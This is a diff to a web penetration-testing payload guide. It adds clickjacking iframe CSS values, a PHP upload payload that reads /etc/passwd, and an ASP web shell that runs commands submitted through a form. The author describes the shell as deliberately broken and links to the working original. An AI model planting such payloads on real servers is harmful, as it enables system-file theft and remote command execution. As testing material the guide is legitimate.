@@ -12,15 +12,15 @@ The following files come from PortSwigger: https://portswigger.net/web-security/
 <style>
     iframe {
         position:relative;
-        width:$width_value;
-        height: $height_value;
-        opacity: $opacity;
+        width: 500px;
+        height: 700px;
+        opacity: .2;
         z-index: 2;
     }
     div {
         position:absolute;
-        top:$top_value;
-        left:$side_value;
+        top:100px;
+        left:50px;
         z-index: 1;
     }
 </style>
@@ -33,15 +33,15 @@ The following files come from PortSwigger: https://portswigger.net/web-security/
 <style>
     iframe {
         position:relative;
-        width:$width_value;
-        height: $height_value;
-        opacity: $opacity;
+        width: 500px;
+        height: 700px;
+        opacity: .2;
         z-index: 2;
     }
     div {
         position:absolute;
-        top:$top_value;
-        left:$side_value;
+        top:100px;
+        left:50px;
         z-index: 1;
     }
 </style>
@@ -93,10 +93,47 @@ https://owasp.org/www-chapter-belgium/assets/2007/2007-06-22/OWASP_BeLux_2007-06
 Known benign XSSinPDF to download: https://github.com/ynsmroztas/pdfsvgxsspayload/blob/main/poc.pdf
 
 ### Remote Code Execution
+These files should be deleted immediately after testing. Leaving these files on your web server could lead to true impact.
+
 **PHP File Upload: file1.php**
 Please note that the file called below should be replaced with a valid Windows file if the Web Server is Linux based.
 
 ```
 <?php echo file_get_contents('/etc/passwd'); ?>
 ```
+**asp Web Shell: test.asp**
+The file below is a butchered version of the file linked below. This version is broken to reduce potential impact if a developer uses it incorrectly or keeps the file uploaded on the web server. If you would like to use a working version of this script, visit the link below. For testing purposes, you do not need a working version.
 
+Source: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.asp
+
+```
+<%
+Server.ScriptTimeout = 180
+
+ip=request.ServerVariables("REMOTE_ADDR")
+if ip<>"1.2.3.4" then
+ response.Status="404 Page Not Found"
+ response.Write(response.Status)
+ response.End
+end if
+
+if Request.Form("submit") <> "" then
+   Dim wshell, intReturn, strPResult
+   cmd = Request.Form("cmd")
+   Response.Write ("Running command: " & cmd & "<br />")
+   Set objCmd = wShell.Exec(cmd)
+   response.write "<br><pre>" & replace(replace(strPResult,"<","&lt;"),vbCrLf,"<br>") & "</pre>"
+   set wshell = nothing
+end if
+
+%>
+<html>
+<body onload="document.shell.cmd.focus()">
+<form action="shell.asp" method="POST" name="shell">
+<input type="submit" name="submit" value="Submit" />
+%ComSpec% /c dir
+</form>
+<hr/>
+</body>
+</html>
+```
